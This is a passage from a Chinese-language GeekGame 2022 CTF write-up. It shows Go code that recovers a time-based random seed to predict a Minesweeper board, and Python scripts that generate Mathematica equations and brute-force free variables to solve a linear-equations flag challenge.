</code></pre></div></div>

<p>有些单词没弄出来，不过这已经不重要了。</p>

<h2 id="扫雷-iiflag-1-部分">扫雷 II（Flag 1 部分）</h2>

<p>Flag 1 很简单，先输一次，然后倒推随机数种子，和今年 HackerGame 的蒙特卡洛一样。</p>

<div class="language-golang highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>

<span class="k">import</span> <span class="p">(</span>
        <span class="s">"fmt"</span>
        <span class="s">"math/rand"</span>
        <span class="s">"time"</span>
<span class="p">)</span>

<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">now</span> <span class="o">:=</span> <span class="n">time</span><span class="o">.</span><span class="n">Now</span><span class="p">()</span><span class="o">.</span><span class="n">UnixMilli</span><span class="p">()</span>
        <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">now</span><span class="p">)</span>

        <span class="k">var</span> <span class="n">line1</span> <span class="kt">int</span>
        <span class="k">var</span> <span class="n">line2</span> <span class="kt">int</span>
        <span class="k">var</span> <span class="n">line3</span> <span class="kt">int</span>

        <span class="n">fmt</span><span class="o">.</span><span class="n">Scanf</span><span class="p">(</span><span class="s">"%b"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">line1</span><span class="p">)</span>
        <span class="n">fmt</span><span class="o">.</span><span class="n">Scanf</span><span class="p">(</span><span class="s">"%b"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">line2</span><span class="p">)</span>
        <span class="n">fmt</span><span class="o">.</span><span class="n">Scanf</span><span class="p">(</span><span class="s">"%b"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">line3</span><span class="p">)</span>

        <span class="k">for</span> <span class="p">{</span>
                <span class="n">now</span> <span class="o">-=</span> <span class="m">1</span>
                <span class="n">rand</span><span class="o">.</span><span class="n">Seed</span><span class="p">(</span><span class="n">now</span><span class="p">)</span>
                <span class="n">got1</span> <span class="o">:=</span> <span class="m">0</span>
                <span class="n">got2</span> <span class="o">:=</span> <span class="m">0</span>
                <span class="n">got3</span> <span class="o">:=</span> <span class="m">0</span>
                <span class="k">for</span> <span class="n">j</span> <span class="o">:=</span> <span class="m">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="m">16</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span> <span class="p">{</span>
                        <span class="n">got1</span> <span class="o">^=</span> <span class="p">((</span><span class="n">rand</span><span class="o">.</span><span class="n">Intn</span><span class="p">(</span><span class="m">257</span><span class="p">))</span> <span class="o">%</span> <span class="m">2</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">j</span>
                <span class="p">}</span>
                <span class="k">for</span> <span class="n">j</span> <span class="o">:=</span> <span class="m">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="m">16</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span> <span class="p">{</span>
                        <span class="n">got2</span> <span class="o">^=</span> <span class="p">((</span><span class="n">rand</span><span class="o">.</span><span class="n">Intn</span><span class="p">(</span><span class="m">257</span><span class="p">))</span> <span class="o">%</span> <span class="m">2</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">j</span>
                <span class="p">}</span>
                <span class="k">for</span> <span class="n">j</span> <span class="o">:=</span> <span class="m">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="m">16</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span> <span class="p">{</span>
                        <span class="n">got3</span> <span class="o">^=</span> <span class="p">((</span><span class="n">rand</span><span class="o">.</span><span class="n">Intn</span><span class="p">(</span><span class="m">257</span><span class="p">))</span> <span class="o">%</span> <span class="m">2</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">j</span>
                <span class="p">}</span>
                <span class="k">if</span> <span class="n">got1</span> <span class="o">==</span> <span class="n">line1</span> <span class="o">&amp;&amp;</span> <span class="n">got2</span> <span class="o">==</span> <span class="n">line2</span> <span class="o">&amp;&amp;</span> <span class="n">got3</span> <span class="o">==</span> <span class="n">line3</span> <span class="p">{</span>
                        <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">now</span><span class="p">)</span>
                        <span class="n">got4</span> <span class="o">:=</span> <span class="m">0</span>
                        <span class="k">for</span> <span class="n">j</span> <span class="o">:=</span> <span class="m">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="m">16</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span> <span class="p">{</span>
                                <span class="n">got4</span> <span class="o">^=</span> <span class="p">((</span><span class="n">rand</span><span class="o">.</span><span class="n">Intn</span><span class="p">(</span><span class="m">257</span><span class="p">))</span> <span class="o">%</span> <span class="m">2</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">j</span>
                        <span class="p">}</span>
                        <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"%016b</span><span class="se">\n\n\n</span><span class="s">"</span><span class="p">,</span> <span class="n">got4</span><span class="p">)</span>
                        <span class="c">// run remaining random numbers</span>
                        <span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="m">4</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="m">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">{</span>
                                <span class="k">for</span> <span class="n">j</span> <span class="o">:=</span> <span class="m">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="m">16</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span> <span class="p">{</span>
                                        <span class="n">rand</span><span class="o">.</span><span class="n">Intn</span><span class="p">(</span><span class="m">257</span><span class="p">)</span>
                                <span class="p">}</span>
                        <span class="p">}</span>
                        <span class="k">break</span>
                <span class="p">}</span>
        <span class="p">}</span>
        <span class="c">// build next map</span>
        <span class="k">type</span> <span class="n">Board</span> <span class="o">=</span> <span class="p">[</span><span class="m">16</span><span class="p">]</span><span class="kt">int</span>
        <span class="k">var</span> <span class="n">board</span> <span class="n">Board</span>
        <span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="m">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">{</span>
                <span class="k">for</span> <span class="n">j</span> <span class="o">:=</span> <span class="m">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="m">16</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span> <span class="p">{</span>
                        <span class="n">board</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="p">((</span><span class="n">rand</span><span class="o">.</span><span class="n">Intn</span><span class="p">(</span><span class="m">257</span><span class="p">))</span> <span class="o">%</span> <span class="m">2</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">j</span>
                <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="m">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">{</span>
                <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"%016b "</span><span class="p">,</span> <span class="n">board</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
        <span class="p">}</span>
        <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">()</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="方程组">方程组</h2>

<p>主要思路：用 Python 生成 Mathematica 代码，然后让 Mathematica 帮我算。</p>

<h3 id="flag-1">Flag 1</h3>

<p>简单的解方程组。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">sympy</span> <span class="kn">import</span> <span class="n">Symbol</span><span class="p">,</span> <span class="n">nsolve</span>
<span class="kn">import</span> <span class="nn">decimal</span>
<span class="n">decimal</span><span class="p">.</span><span class="n">getcontext</span><span class="p">().</span><span class="n">prec</span> <span class="o">=</span> <span class="mi">5</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"result.txt"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">res</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="nb">iter</span><span class="p">(</span><span class="n">f</span><span class="p">)))</span>

<span class="n">l</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>

<span class="n">primes</span> <span class="o">=</span> <span class="p">[</span><span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">29</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">41</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">61</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">79</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">89</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">113</span><span class="p">,</span> <span class="mi">127</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">139</span><span class="p">,</span> <span class="mi">149</span><span class="p">,</span> <span class="mi">151</span><span class="p">,</span> <span class="mi">157</span><span class="p">,</span> <span class="mi">163</span><span class="p">,</span> <span class="mi">167</span><span class="p">,</span> <span class="mi">173</span><span class="p">,</span> <span class="mi">179</span><span class="p">,</span> <span class="mi">181</span><span class="p">,</span> <span class="mi">191</span><span class="p">,</span> <span class="mi">193</span><span class="p">,</span> <span class="mi">197</span><span class="p">,</span> <span class="mi">199</span><span class="p">,</span> <span class="mi">211</span><span class="p">,</span> <span class="mi">223</span><span class="p">,</span> <span class="mi">227</span><span class="p">,</span> <span class="mi">229</span><span class="p">,</span> <span class="mi">233</span><span class="p">,</span> <span class="mi">239</span><span class="p">,</span> <span class="mi">241</span><span class="p">,</span> <span class="mi">251</span><span class="p">,</span> <span class="mi">257</span><span class="p">,</span> <span class="mi">263</span><span class="p">,</span> <span class="mi">269</span><span class="p">,</span> <span class="mi">271</span><span class="p">][:</span><span class="n">l</span><span class="p">]</span>
<span class="n">sprimes</span> <span class="o">=</span> <span class="p">[</span><span class="nb">float</span><span class="p">(</span><span class="n">decimal</span><span class="p">.</span><span class="n">Decimal</span><span class="p">(</span><span class="n">i</span><span class="p">).</span><span class="n">sqrt</span><span class="p">())</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">primes</span><span class="p">]</span>
<span class="n">variables</span> <span class="o">=</span> <span class="p">[</span><span class="n">Symbol</span><span class="p">(</span><span class="sa">f</span><span class="s">"x</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">"</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">l</span><span class="p">)]</span>

<span class="c1"># variables[0] = ord('f')
# variables[1] = ord('l')
# variables[2] = ord('a')
# variables[3] = ord('g')
# variables[4] = ord('{')
# variables[-1] = ord('}')
</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">l</span><span class="p">):</span>
    <span class="n">eq</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">([</span><span class="n">sprimes</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">*</span><span class="n">variables</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">l</span><span class="p">)])</span>
    <span class="n">sprimes</span><span class="o">=</span><span class="p">[</span><span class="n">sprimes</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]]</span><span class="o">+</span><span class="n">sprimes</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">eq</span><span class="si">}</span><span class="s">==</span><span class="si">{</span><span class="n">res</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="si">}</span><span class="s">,"</span><span class="p">)</span>
</code></pre></div></div>

<p>因为精度太低，如果放 <code class="language-plaintext highlighter-rouge">flag{}</code> 的整数值，方程就解不出来了。效果如图：</p>

<p><img src="/pictures/geekgame-2022/mathematica1.png" alt="Mathematica for Flag 1"></p>

<p>每个变量 round 再 chr 一下就行。</p>

<h3 id="flag-2">Flag 2</h3>

<p>多出了一些自由变量，但是我们知道 flag 明文的开头五个字符和结尾一个字符，减小了计算量。</p>

<p>脚本也是类似的：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># from sympy import Symbol, nsolve
</span><span class="kn">import</span> <span class="nn">decimal</span>
<span class="n">decimal</span><span class="p">.</span><span class="n">getcontext</span><span class="p">().</span><span class="n">prec</span> <span class="o">=</span> <span class="mi">15</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"result.txt"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">it</span> <span class="o">=</span> <span class="nb">iter</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
    <span class="nb">next</span><span class="p">(</span><span class="n">it</span><span class="p">)</span>

    <span class="n">res</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">it</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>

<span class="n">l</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">res</span><span class="p">)</span><span class="o">+</span><span class="mi">10</span>

<span class="n">primes</span> <span class="o">=</span> <span class="p">[</span><span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">29</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">41</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">61</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">79</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">89</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">113</span><span class="p">,</span> <span class="mi">127</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">139</span><span class="p">,</span> <span class="mi">149</span><span class="p">,</span> <span class="mi">151</span><span class="p">,</span> <span class="mi">157</span><span class="p">,</span> <span class="mi">163</span><span class="p">,</span> <span class="mi">167</span><span class="p">,</span> <span class="mi">173</span><span class="p">,</span> <span class="mi">179</span><span class="p">,</span> <span class="mi">181</span><span class="p">,</span> <span class="mi">191</span><span class="p">,</span> <span class="mi">193</span><span class="p">,</span> <span class="mi">197</span><span class="p">,</span> <span class="mi">199</span><span class="p">,</span> <span class="mi">211</span><span class="p">,</span> <span class="mi">223</span><span class="p">,</span> <span class="mi">227</span><span class="p">,</span> <span class="mi">229</span><span class="p">,</span> <span class="mi">233</span><span class="p">,</span> <span class="mi">239</span><span class="p">,</span> <span class="mi">241</span><span class="p">,</span> <span class="mi">251</span><span class="p">,</span> <span class="mi">257</span><span class="p">,</span> <span class="mi">263</span><span class="p">,</span> <span class="mi">269</span><span class="p">,</span> <span class="mi">271</span><span class="p">][:</span><span class="n">l</span><span class="p">]</span>
<span class="n">sprimes</span> <span class="o">=</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">decimal</span><span class="p">.</span><span class="n">Decimal</span><span class="p">(</span><span class="n">i</span><span class="p">).</span><span class="n">sqrt</span><span class="p">())</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">primes</span><span class="p">]</span>
<span class="n">variables</span> <span class="o">=</span> <span class="p">[(</span><span class="sa">f</span><span class="s">"x</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">"</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">l</span><span class="p">)]</span>

<span class="n">variables</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s">'f'</span><span class="p">))</span>
<span class="n">variables</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s">'l'</span><span class="p">))</span>
<span class="n">variables</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s">'a'</span><span class="p">))</span>
<span class="n">variables</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s">'g'</span><span class="p">))</span>
<span class="n">variables</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s">'{'</span><span class="p">))</span>
<span class="n">variables</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s">'}'</span><span class="p">))</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">l</span><span class="o">-</span><span class="mi">10</span><span class="p">):</span>
    <span class="n">eq</span> <span class="o">=</span> <span class="s">"+"</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="n">sprimes</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="o">+</span><span class="s">"*"</span><span class="o">+</span><span class="n">variables</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">l</span><span class="p">)])</span>
    <span class="n">sprimes</span><span class="o">=</span><span class="p">[</span><span class="n">sprimes</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]]</span><span class="o">+</span><span class="n">sprimes</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">eq</span><span class="si">}</span><span class="s">==</span><span class="si">{</span><span class="n">res</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="si">}</span><span class="s">,"</span><span class="p">)</span>
</code></pre></div></div>

<p>计算结果类似于：</p>

<p><img src="/pictures/geekgame-2022/mathematica2.png" alt="Mathematica for Flag 2"></p>

<p>可以看到只有四个自由变量，因此穷举吧！</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">decimal</span> <span class="kn">import</span> <span class="n">Decimal</span><span class="p">,</span> <span class="n">getcontext</span>
<span class="n">getcontext</span><span class="p">().</span><span class="n">prec</span> <span class="o">=</span> <span class="mi">15</span>

<span class="n">l</span> <span class="o">=</span> <span class="p">[</span>
    <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">:</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"123.155429211903"</span><span class="p">)</span> <span class="o">+</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.101389666524775"</span><span class="p">)</span> <span class="o">*</span><span class="n">a</span> <span class="o">+</span> 
  <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.097363807490860"</span><span class="p">)</span> <span class="o">*</span><span class="n">b</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.020169276822607"</span><span class="p">)</span> <span class="o">*</span><span class="n">c</span> <span class="o">-</span> 
  <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.20153492775911"</span><span class="p">)</span> <span class="o">*</span><span class="n">d</span><span class="p">,</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">:</span> 
 <span class="n">Decimal</span><span class="p">(</span><span class="s">"66.753732410249"</span><span class="p">)</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.080676972507318"</span><span class="p">)</span> <span class="o">*</span><span class="n">a</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.068793134263978"</span><span class="p">)</span> <span class="o">*</span><span class="n">b</span> <span class="o">-</span> 
  <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.038041112610789"</span><span class="p">)</span> <span class="o">*</span><span class="n">c</span> <span class="o">+</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.019977914404265"</span><span class="p">)</span> <span class="o">*</span><span class="n">d</span><span class="p">,</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">:</span> 
 <span class="n">Decimal</span><span class="p">(</span><span class="s">"120.510127947916"</span><span class="p">)</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.070262973222038"</span><span class="p">)</span> <span class="o">*</span><span class="n">a</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.111782583438457"</span><span class="p">)</span> <span class="o">*</span><span class="n">b</span> <span class="o">+</span> 
  <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.0045955960745912"</span><span class="p">)</span> <span class="o">*</span><span class="n">c</span> <span class="o">+</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.148780314600433"</span><span class="p">)</span> <span class="o">*</span><span class="n">d</span><span class="p">,</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">:</span> 
 <span class="n">Decimal</span><span class="p">(</span><span class="s">"90.618489437347"</span><span class="p">)</span> <span class="o">+</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.062727688419161"</span><span class="p">)</span> <span class="o">*</span><span class="n">a</span> <span class="o">+</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.047384309915314"</span><span class="p">)</span> <span class="o">*</span><span class="n">b</span> <span class="o">-</span> 
  <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.030472924939055"</span><span class="p">)</span> <span class="o">*</span><span class="n">c</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.045645647604480"</span><span class="p">)</span> <span class="o">*</span><span class="n">d</span><span class="p">,</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">:</span> 
 <span class="n">Decimal</span><span class="p">(</span><span class="s">"98.715122899750"</span><span class="p">)</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.0055945410670141"</span><span class="p">)</span> <span class="o">*</span><span class="n">a</span> <span class="o">+</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.033140466563841"</span><span class="p">)</span> <span class="o">*</span><span class="n">b</span> <span class="o">+</span> 
  <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.0089388391453946"</span><span class="p">)</span> <span class="o">*</span><span class="n">c</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.050751991978813"</span><span class="p">)</span> <span class="o">*</span><span class="n">d</span><span class="p">,</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">:</span> 
 <span class="n">Decimal</span><span class="p">(</span><span class="s">"112.150702040079"</span><span class="p">)</span> <span class="o">+</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.037506392455473"</span><span class="p">)</span> <span class="o">*</span><span class="n">a</span> <span class="o">+</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.027907059645255"</span><span class="p">)</span> <span class="o">*</span><span class="n">b</span> <span class="o">+</span> 
  <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.021569898858446"</span><span class="p">)</span> <span class="o">*</span><span class="n">c</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.068875515932615"</span><span class="p">)</span> <span class="o">*</span><span class="n">d</span><span class="p">,</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">:</span> 
 <span class="n">Decimal</span><span class="p">(</span><span class="s">"109.695467443018"</span><span class="p">)</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.023274207539976"</span><span class="p">)</span> <span class="o">*</span><span class="n">a</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.028742888651852"</span><span class="p">)</span> <span class="o">*</span><span class="n">b</span> <span class="o">-</span> 
  <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.039178707119570"</span><span class="p">)</span> <span class="o">*</span><span class="n">c</span> <span class="o">+</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.0109083161238284"</span><span class="p">)</span> <span class="o">*</span><span class="n">d</span><span class="p">,</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">:</span> 
 <span class="n">Decimal</span><span class="p">(</span><span class="s">"99.515475382890"</span><span class="p">)</span> <span class="o">+</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.054055016733775"</span><span class="p">)</span> <span class="o">*</span><span class="n">a</span> <span class="o">+</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.044247505511186"</span><span class="p">)</span> <span class="o">*</span><span class="n">b</span> <span class="o">-</span> 
  <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.0139898105272784"</span><span class="p">)</span> <span class="o">*</span><span class="n">c</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.126379776998097"</span><span class="p">)</span> <span class="o">*</span><span class="n">d</span><span class="p">,</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">:</span> 
 <span class="n">Decimal</span><span class="p">(</span><span class="s">"111.968668632099"</span><span class="p">)</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.061819147622102"</span><span class="p">)</span> <span class="o">*</span><span class="n">a</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.064617656763999"</span><span class="p">)</span> <span class="o">*</span><span class="n">b</span> <span class="o">-</span> 
  <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.040343307207692"</span><span class="p">)</span> <span class="o">*</span><span class="n">c</span> <span class="o">+</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.031984542984781"</span><span class="p">)</span> <span class="o">*</span><span class="n">d</span><span class="p">,</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">:</span> 
 <span class="n">Decimal</span><span class="p">(</span><span class="s">"96.249194018699"</span><span class="p">)</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.069833572922601"</span><span class="p">)</span> <span class="o">*</span><span class="n">a</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.092647652376285"</span><span class="p">)</span> <span class="o">*</span><span class="n">b</span> <span class="o">+</span> 
